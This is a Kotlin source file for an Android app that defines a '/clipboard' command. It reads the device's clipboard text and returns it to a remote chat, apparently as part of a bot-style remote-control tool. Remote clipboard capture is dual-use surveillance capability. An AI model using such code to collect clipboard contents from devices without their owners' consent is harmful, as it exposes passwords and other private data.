package com.izhaanintellect.pasa.commands

import android.content.ClipData
import android.content.ClipboardManager
import android.content.Context
import android.os.Handler
import android.os.Looper
import android.util.Log
import dagger.hilt.android.qualifiers.ApplicationContext
import kotlinx.coroutines.suspendCancellableCoroutine
import javax.inject.Inject
import javax.inject.Singleton
import kotlin.coroutines.resume

/**
 * Handles remote clipboard retrieval.
 */
@Singleton
class ClipboardCommand @Inject constructor(
    @ApplicationContext private val context: Context
) : Command {

    override val name = "/clipboard"
    override val description = "Retrieve current text from device clipboard"
    override val usage = "/clipboard"

    companion object {
        private const val TAG = "PASA_Clipboard"
    }

    override suspend fun execute(args: List<String>, chatId: Long): CommandResult {
        return suspendCancellableCoroutine { continuation ->
            Handler(Looper.getMainLooper()).post {
                try {
                    val clipboard = context.getSystemService(Context.CLIPBOARD_SERVICE) as ClipboardManager
                    val clip = clipboard.primaryClip

                    if (clip != null && clip.itemCount > 0) {
                        val text = clip.getItemAt(0).coerceToText(context).toString()
                        if (text.isNotBlank()) {
                            val sanitized = text.replace("<", "&lt;").replace(">", "&gt;")
                            continuation.resume(
                                CommandResult(
                                    success = true,
                                    message = "📋 <b>Device Clipboard</b>\n" +
                                            "━━━━━━━━━━━━━━━━━━━━\n" +
                                            "<code>$sanitized</code>"
                                )
                            )
                            return@post
                        }
                    }

                    continuation.resume(
                        CommandResult(
                            success = true,
                            message = "📋 <b>Clipboard</b> is currently empty or contains non-text data."
                        )
                    )
                } catch (e: Exception) {
                    Log.w(TAG, "Failed to read clipboard: ${e.message}")
                    continuation.resume(
                        CommandResult(
                            success = false,
                            message = "⚠️ Could not read clipboard (may be restricted while device is locked or in background): ${e.message}"
                        )
                    )
                }
            }
        }
    }
}
